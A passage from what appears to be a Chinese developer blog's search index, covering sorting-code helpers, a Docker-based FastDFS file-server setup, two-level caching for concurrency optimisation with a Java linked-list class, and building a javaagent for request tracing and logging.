length</span>):</span><br><span class=\"line\">    <span class=\"keyword\">import</span> random</span><br><span class=\"line\">    start, stop = (<span class=\"built_in\">int</span>(start), <span class=\"built_in\">int</span>(stop)) <span class=\"keyword\">if</span> start &lt;= stop <span class=\"keyword\">else</span> (<span class=\"built_in\">int</span>(stop), <span class=\"built_in\">int</span>(start))</span><br><span class=\"line\">    length = <span class=\"built_in\">int</span>(<span class=\"built_in\">abs</span>(length)) <span class=\"keyword\">if</span> length <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    random_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        random_list.append(random.randint(start, stop))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> random_list</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">now</span>():</span><br><span class=\"line\">    <span class=\"keyword\">import</span> time</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(<span class=\"built_in\">round</span>(time.time() * <span class=\"number\">1000</span>))</span><br></pre></td></tr></table></figure>\n\n<p>在上述图形化中，因为为了展现较好的效果，做了图形移动。如果不需要由移动效果，可以直接保存数组，在每次数组变动后，清除图形，然后依据变化后的数组重新画图，那么相对而言更为简单。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JUEwJTg2JUU2JThFJTkyJUU1JUJBJThG\">wikipedia·堆排序<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>各种排序复杂度：<br><img src=\"/images/old/20180504sort.png\"></p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9uYW5uYW5JVGV5ZS9hcmNoaXZlLzIwMTMvMDQvMTEvMzAxMzczNy5odG1s\">常用排序算法稳定性、时间复杂度分析<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>源码地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3doaHh6L2dyYXBoaWMtYWxnb3JpdGht\">https://github.com/whhxz/graphic-algorithm<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["算法","排序"],"tags":["冒泡排序","堆排序","插入排序","并归排序","快速排序","选择排序"]},{"title":"docker搭建fastdfs","url":"/2018/07/04/docker%E6%90%AD%E5%BB%BAfastdfs/","content":"<p>使用fastdfs搭建文件服务器，用于存储图片。通过docker虚拟服务完成分布式系统的搭建。</p>\n\n<h3 id=\"构建基础镜像\"><a href=\"#构建基础镜像\" class=\"headerlink\" title=\"构建基础镜像\"></a>构建基础镜像</h3><p>为了方便服务的启动以及后续的配置，需要先创建基本的fastdfs镜像。</p>\n<span id=\"more\"></span>\n<p>创建如下目录结构：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3doaHh6L3NvZnQtZG9ja2VyL3RyZWUvbWFzdGVyL2Zhc3RkZnM=\">https://github.com/whhxz/soft-docker/tree/master/fastdfs<i class=\"fa fa-external-link-alt\"></i></span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── conf    //存储配置文件</span><br><span class=\"line\">│   ├── client.conf</span><br><span class=\"line\">│   ├── fastdfs.conf</span><br><span class=\"line\">│   ├── http.conf</span><br><span class=\"line\">│   ├── mime.types</span><br><span class=\"line\">│   ├── mod_fastdfs.conf</span><br><span class=\"line\">│   ├── nginx.conf</span><br><span class=\"line\">│   ├── storage.conf</span><br><span class=\"line\">│   └── tracker.conf</span><br><span class=\"line\">├── data    //volumes目录</span><br><span class=\"line\">│   ├── storage</span><br><span class=\"line\">│   ├── storage1</span><br><span class=\"line\">│   └── tracker</span><br><span class=\"line\">├── docker-compose.yml</span><br><span class=\"line\">├── Dockerfile</span><br><span class=\"line\">├── init.sh //启动</span><br><span class=\"line\">└── soft //需要安装的软件</span><br><span class=\"line\">    ├── fastdfs //https://github.com/happyfish100/fastdfs.git --depth 1</span><br><span class=\"line\">    ├── fastdfs-nginx-module //https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1</span><br><span class=\"line\">    ├── libfastcommon   //https://github.com/happyfish100/libfastcommon.git --depth 1</span><br><span class=\"line\">    └── nginx-1.12.2    //http://nginx.org/download/nginx-1.12.2.tar.gz</span><br></pre></td></tr></table></figure>\n<p>如上目录，先下载必须的安装软件，然后编写构建镜像时需要执行的脚本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#切换阿里云镜像</span></span><br><span class=\"line\"><span class=\"built_in\">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class=\"line\">yum makecache</span><br><span class=\"line\"><span class=\"comment\">#安装必须依赖</span></span><br><span class=\"line\">yum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel -y</span><br><span class=\"line\"><span class=\"comment\">#创建工作目录</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /fastdfs/tracker</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /fastdfs/storage</span><br><span class=\"line\"><span class=\"comment\">#遍历项目</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /usr/local/src</span><br><span class=\"line\"><span class=\"built_in\">cd</span> libfastcommon/</span><br><span class=\"line\">./make.sh &amp;&amp; ./make.sh install</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ../fastdfs/</span><br><span class=\"line\">./make.sh &amp;&amp; ./make.sh install</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ../nginx-1.12.2/</span><br><span class=\"line\">./configure --add-module=/usr/local/src/fastdfs-nginx-module/src</span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>创建<code>Dockerfile</code>构建镜像</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> centos</span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./soft ./init.sh /usr/local/src/</span></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/local/src/</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> sh init.sh</span></span><br><span class=\"line\"><span class=\"keyword\">EXPOSE</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;/usr/local/nginx/sbin/./nginx&quot;</span>, <span class=\"string\">&quot;-g&quot;</span>, <span class=\"string\">&quot;daemon off;&quot;</span>]</span></span><br></pre></td></tr></table></figure>\n<p>使用命令<code>docker build -t fastdfs --rm=true .</code>构建镜像</p>\n<h3 id=\"配置启动服务\"><a href=\"#配置启动服务\" class=\"headerlink\" title=\"配置启动服务\"></a>配置启动服务</h3><p>创建镜像之后，通过<code>docker-compase</code>配置启动服务</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;2&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">    <span class=\"comment\">#tracker服务</span></span><br><span class=\"line\">  <span class=\"attr\">fdfs_tracker:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">fastdfs</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">fdfs_tracker</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/tracker.conf:/etc/fdfs/tracker.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/storage.conf:/etc/fdfs/storage.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/client.conf:/etc/fdfs/client.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/http.conf:/etc/fdfs/http.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/mime.types:/etc/fdfs/mime.types</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/mod_fastdfs.conf:/etc/fdfs/mod_fastdfs.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/nginx.conf:/usr/local/nginx/conf/nginx.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./data/tracker:/fastdfs/tracker</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./data/storage:/fastdfs/storage</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">22122</span><span class=\"string\">:22122</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span> <span class=\"string\">bash</span> <span class=\"string\">-c</span> <span class=\"string\">&quot;/etc/init.d/fdfs_trackerd start &amp;&amp; tail -f /fastdfs/tracker/logs/trackerd.log&quot;</span></span><br><span class=\"line\">  <span class=\"comment\">#storage服务</span></span><br><span class=\"line\">  <span class=\"attr\">fdfs_storage:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">fastdfs</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">fdfs_storage</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/tracker.conf:/etc/fdfs/tracker.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/storage.conf:/etc/fdfs/storage.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/client.conf:/etc/fdfs/client.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/http.conf:/etc/fdfs/http.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/mime.types:/etc/fdfs/mime.types</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/mod_fastdfs.conf:/etc/fdfs/mod_fastdfs.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/nginx.conf:/usr/local/nginx/conf/nginx.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./data/tracker:/fastdfs/tracker</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./data/storage:/fastdfs/storage</span></span><br><span class=\"line\">    <span class=\"attr\">links:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">fdfs_tracker</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">23000</span><span class=\"string\">:23000</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">9898</span><span class=\"string\">:9898</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span> <span class=\"string\">bash</span> <span class=\"string\">-c</span> <span class=\"string\">&quot;/etc/init.d/fdfs_storaged start &amp;&amp; /usr/local/nginx/sbin/./nginx &amp;&amp;  tail -f /fastdfs/storage/logs/storaged.log&quot;</span></span><br><span class=\"line\">  <span class=\"comment\">#storage服务</span></span><br><span class=\"line\">  <span class=\"attr\">fdfs_storage1:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">fastdfs</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">fdfs_storage1</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./conf/tracker.conf:/etc/fdfs/tracker.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/storage.conf:/etc/fdfs/storage.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/client.conf:/etc/fdfs/client.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/http.conf:/etc/fdfs/http.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/mime.types:/etc/fdfs/mime.types</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/mod_fastdfs.conf:/etc/fdfs/mod_fastdfs.conf</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./conf/nginx.conf:/usr/local/nginx/conf/nginx.conf</span></span><br><span class=\"line\">      <span class=\"comment\">#- ./data/tracker:/fastdfs/tracker</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./data/storage1:/fastdfs/storage</span></span><br><span class=\"line\">    <span class=\"attr\">links:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">fdfs_tracker</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">23001</span><span class=\"string\">:23000</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">9899</span><span class=\"string\">:9898</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span> <span class=\"string\">bash</span> <span class=\"string\">-c</span> <span class=\"string\">&quot;/etc/init.d/fdfs_storaged start &amp;&amp; /usr/local/nginx/sbin/./nginx &amp;&amp; tail -f /fastdfs/storage/logs/storaged.log&quot;</span></span><br></pre></td></tr></table></figure>\n<p>在conf中的配置文件可以查看<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhcHB5ZmlzaDEwMC9mYXN0ZGZzL3dpa2k=\">fastdfs Wiki<i class=\"fa fa-external-link-alt\"></i></span></p>\n<ul>\n<li>在配置tracker的ip时需要注意的是，在单机使用时，不能配置localhost，需要配置具体的ip。</li>\n</ul>\n<p>通过命令<code>docker-compose up</code>启动服务，之后可以通过客户端上传文件。之后在浏览器中直接访问。</p>\n<p>在使用Java客户端上传文件时（其他客户端为尝试），需要<code>StorageServer</code>这个默认是连接<code>TrackerClient</code>之后获取storage的地址，但是因为使用的是docker，返回的ip是docker内部ip，这样就会导致上传失败，可以手动创建<code>StorageServer</code>对象，ip填写主机地址以及映射端口，暂时未想到其他解决方案。</p>\n<p>因为使用的是多个storage服务，在指定其中一个上传后，在另外的服务器地址也可以照样访问。</p>\n<ul>\n<li>在启动时，可能会出现<code>tail -f</code>命令的错误，因为可能文件未生成，可以先修改为其他文件，之后在改回来，使用<code>tail -f</code>目的是为了保持docker持续的运行</li>\n</ul>\n","categories":["docker","分布式"],"tags":["docker","fastdfs","图片服务器"]},{"title":"并发优化记录","url":"/2018/12/25/%E5%B9%B6%E5%8F%91%E4%BC%98%E5%8C%96%E8%AE%B0%E5%BD%95/","content":"<h3 id=\"业务逻辑\"><a href=\"#业务逻辑\" class=\"headerlink\" title=\"业务逻辑\"></a>业务逻辑</h3><p>主要是通过商品查询商品相关的活动信息，流程如下</p>\n<blockquote>\n<p>1、查询商品相关信息（DB）<br>2、查询商品对应活动相关信息（DB）<br>3、查询商品在指定门店是否被排除（DB）<br>4、赠品库存校验（HTTP）<br>5、限购校验（HTTP+Redis）<br>6、数据封装返回</p>\n</blockquote>\n<p>业务逻辑流程比较清晰</p>\n<span id=\"more\"></span>\n<h3 id=\"初次优化\"><a href=\"#初次优化\" class=\"headerlink\" title=\"初次优化\"></a>初次优化</h3><p>对数据操纵做异步处理，使用线程池，对数据异步处理后，统一汇总，返回数据<br><img src=\"/images/old/20181225%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-12-25%E4%B8%8B%E5%8D%888.04.59.png\"><br>对数据做异步优化如上所示。<br>把其中3个流程通过线程池做异步处理，当前线程处理相关数据，之后对数据进行汇总对数据进行封装返回。</p>\n<h3 id=\"加入缓存二次优化\"><a href=\"#加入缓存二次优化\" class=\"headerlink\" title=\"加入缓存二次优化\"></a>加入缓存二次优化</h3><p>缓存设计为一、二级缓存。一级缓存为本地缓存速度快、缓存时间短、数量少，项目部署都是多机部署，所以一级缓存对于不同服务器数据有冗余。二级缓存未Redis远程缓存速度比本地缓存慢、存储时间相对长、数量大。如果一、二级缓存穿透流程会流转到DB逻辑，如初次优化逻辑处理。<br>数据流程如下：<br><img src=\"/images/old/20181225%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-12-25%E4%B8%8B%E5%8D%888.16.03.png\"><br>批量数据处理，如果一级缓存命中，走正常逻辑，未命中数据流转到下一级。二级缓存如果未命中，数据流转到下一级。一二级缓存未命中逻辑处理逻辑一致，都是对数据进行过滤以及重新缓存。如果某级全部未命中，那么流转到下一级走同步方法，不需要走线程池异步处理。</p>\n<h3 id=\"缓存问题\"><a href=\"#缓存问题\" class=\"headerlink\" title=\"缓存问题\"></a>缓存问题</h3><p>缓存可能会存在几个问题</p>\n<h4 id=\"缓存雪崩\"><a href=\"#缓存雪崩\" class=\"headerlink\" title=\"缓存雪崩\"></a>缓存雪崩</h4><p>如果缓存出现大批量过期，那么会导致大批量数据流转到DB，数据库压力大增，可能会导致数据库崩溃。<br>在设置缓存的时候，加入了随机值，避免同一时间大量缓存失效。</p>\n<h4 id=\"缓存穿透\"><a href=\"#缓存穿透\" class=\"headerlink\" title=\"缓存穿透\"></a>缓存穿透</h4><p>在查询数据的时候，如果有很多key查询不到数据，不做处理，这样会导致大量没数据的key走到DB层，这样接口的TPS会比较低，那么需要对不存在的数据一样进行缓存，缓存内容为空数据，避免缓存穿透</p>\n<h4 id=\"缓存击穿\"><a href=\"#缓存击穿\" class=\"headerlink\" title=\"缓存击穿\"></a>缓存击穿</h4><p>当缓存过期后，再次查询缓存会查询不到数据，这样数据会走到DB。这样的问题，需要对缓存数据进行更新。<br>设计一个多生产者批量插入，单消费者可以批量处理的逻辑。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Concurrentlink</span></span><br><span class=\"line\"><span class=\"comment\"> * 并发链表</span></span><br><span class=\"line\"><span class=\"comment\"> * 仅单消费者、多生产者</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by xuzhuo on 2018/12/25.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ConcurrentLink</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; head;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; tail;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">AtomicInteger</span> <span class=\"variable\">headi</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AtomicInteger</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">AtomicInteger</span> <span class=\"variable\">taili</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AtomicInteger</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Object</span> <span class=\"variable\">addLock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">THRESHOLD_VAL</span> <span class=\"operator\">=</span> <span class=\"number\">10000000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcurrentLink</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        Node&lt;T&gt; empty = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(<span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        head = empty;</span><br><span class=\"line\">        tail = empty;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">(Collection&lt;T&gt; list)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (list.isEmpty()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; thead = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Node&lt;T&gt; next = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (T t : list) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (thead == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                thead = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(t, <span class=\"literal\">null</span>);</span><br><span class=\"line\">                next = thead;</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            next.next = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(t, <span class=\"literal\">null</span>);</span><br><span class=\"line\">            next = next.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            lock.lock();</span><br><span class=\"line\">            tail.next = thead;</span><br><span class=\"line\">            tail = next;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        taili.addAndGet(list.size());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> list.size();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;T&gt; <span class=\"title function_\">poll</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">min</span> <span class=\"operator\">=</span> Math.min(size(), num);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (min &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        List&lt;T&gt; res = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; min; i++) &#123;</span><br><span class=\"line\">            Node&lt;T&gt; next = head.next;</span><br><span class=\"line\">            <span class=\"comment\">//清空链接、方便回收</span></span><br><span class=\"line\">            head.next = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            head.item = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            head = next;</span><br><span class=\"line\">            res.add(head.item);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        headi.addAndGet(min);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (taili.get() &gt; THRESHOLD_VAL) &#123;</span><br><span class=\"line\">            taili.addAndGet(-THRESHOLD_VAL);</span><br><span class=\"line\">            headi.addAndGet(-THRESHOLD_VAL);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">size</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> taili.get() - headi.get();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Node</span>&lt;T&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> T item;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Node&lt;T&gt; next;</span><br><span class=\"line\"></span><br><span class=\"line\">        Node(T item, Node&lt;T&gt; next) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.item = item;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.next = next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在设计缓存的时候，在存储的value上加上缓存失效时间字段，一级缓存为7分30秒50000条数据，二级缓存字段设置失效时间为10分钟，实际存入Redis时间较长为10分钟+1分钟+60内随机秒，当一级缓存失效好，数据流转到二级缓存，在二级缓存处判断缓存是否即将失效（3分钟），因为实际缓存时间较长，所以数据还是会正常走缓存获取，只是对于即将失效的数据，会把数据存入之前设计的链表中，在项目启动的时候，会启动一个线程每次从缓存中批量获取数据，然后对数据同步到缓存。因为实际缓存时间较长，所以在同步的这个时间段内，数据还是会走正常缓存。</p>\n","categories":["并发"],"tags":["优化"]},{"title":"snake-agent初步搭建","url":"/2018/12/27/snake-agent%E5%88%9D%E6%AD%A5%E6%90%AD%E5%BB%BA/","content":"<p>准备从0搭建一个框架，设计调用链，写下构建过程。</p>\n<h3 id=\"agent基础使用\"><a href=\"#agent基础使用\" class=\"headerlink\" title=\"agent基础使用\"></a>agent基础使用</h3><p>在JDK6的时候，更新了javaagent，在启动前会执行jar中配置的premain。在启动项目前在代码中对加载的class进行字节码修改，插入特定代码，如日志输入输出，达到项目跟踪的目的。</p>\n<span id=\"more\"></span>\n<h3 id=\"classLoader加载lib\"><a href=\"#classLoader加载lib\" class=\"headerlink\" title=\"classLoader加载lib\"></a>classLoader加载lib</h3><p>在agent中通过使用<code>System.getProperty(&quot;java.class.path&quot;)</code>获取启动的classPath，通过解析值可以获取到启动agentJar路径等相关值，从而定位到目录地址，通过获取到的目录地址得到获取项目的配置文件以及相关依赖的jar。</p>\n<p>加载解析配置文件，通过自定义classLoader加载依赖的jar。达到agent的启动项目的依赖分离而不会产生jar的冲突。</p>\n<h3 id=\"加载指定启动类\"><a href=\"#加载指定启动类\" class=\"headerlink\" title=\"加载指定启动类\"></a>加载指定启动类</h3><p>通过之前设置的classLoader加载需要加载的class，启动项目。在classLoader中加载的<code>DefaultAgent</code>中输出日志。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>1、通过javaagent添加启动参数<br>2、通过classLoader加载指定class<br>3、class构建对象<br>4、启动项目</p>\n<p>看项目tar0.0.1</p>\n","categories":["snake"],"tags":["agent","classLoader"]},{"title":"snake-agent拦截及日志输出","url":"/2019/01/04/snake-agent%E6%8B%A6%E6%88%AA%E5%8F%8A%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA/","content":"<h3 id=\"Spring请求拦截\"><a href=\"#Spring请求拦截\" class=\"headerlink\" title=\"Spring请求拦截\"></a>Spring请求拦截</h3><p>在使用Spring框架时，可以知道所有Spring入口都是从<code>org.springframework.web.servlet.FrameworkServlet.processRequest</code>中进入，可以通过对该方法进行字节码增强，达到拦截的目的。<br>使用<code>javassist</code>对<code>processRequest</code>方法的前后分别插入操作代码。通过<code>javassist</code>提供获取当前对象出入参数等，做一些相关的操作。</p>\n<span id=\"more\"></span>\n<h4 id=\"修改注册\"><a href=\"#修改注册\" class=\"headerlink\" title=\"修改注册\"></a>修改注册</h4><p>在创建拦截操作对象时，为了保证在代码插入后生效，创建一个静态的注册类<code>InterceptorRegistry</code>，在创建代码时，生成一个唯一的id，通过<code>javassist</code>修改字节码时，带入该ID，就可以准确找到对应的修改类。</p>\n<h3 id=\"日志输出\"><a href=\"#日志输出\" class=\"headerlink\" title=\"日志输出\"></a>日志输出</h3><p>在agent中，日志依赖需要使用自定义的类加载器加载，使agent依赖的jar和项目的jar进行隔离。这样就会出现，父类加载器（项目类加载器）需要调用子类加载器（自定义类加载器）加载的对象。</p>\n<p>自定义日志类关系如下：<br><img src=\"/images/old/20190104%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72019-01-04%E4%B8%8A%E5%8D%8811.01.44.png\"><br>其中接口<code>Logger</code>、<code>LoggerBinder</code>类<code>LogManager</code>由父类加载器加载，其实现类<code>Log4j2Logger</code>、<code>Log4j2Binder</code>由子类加载器加载。<br>在使用的时候，如果初始化LogManner传入Log4j2Logger达到类加载分离。因为在自定义类加载器中，只加载部分类，其他的类由父类加载。<br>方法的调用，通过接口进行连接，具体实现由子类加载器处理。</p>\n<p>代码详情请看 v0.0.2</p>\n","categories":["snake"],"tags":["classLoader","snake"]},{"title":"Java基础-String中replace","url":"/2020/04/20/Java%E5%9F%BA%E7%A1%80-String%E4%B8%ADreplace/","content":"<p>String中replace是我们常用的一个方法，用于替换字符中的字母。</p>\n<h3 id=\"方法java-lang-String-replace-char-char\"><a href=\"#方法java-lang-String-replace-char-char\" class=\"headerlink\" title=\"方法java.lang.String#replace(char, 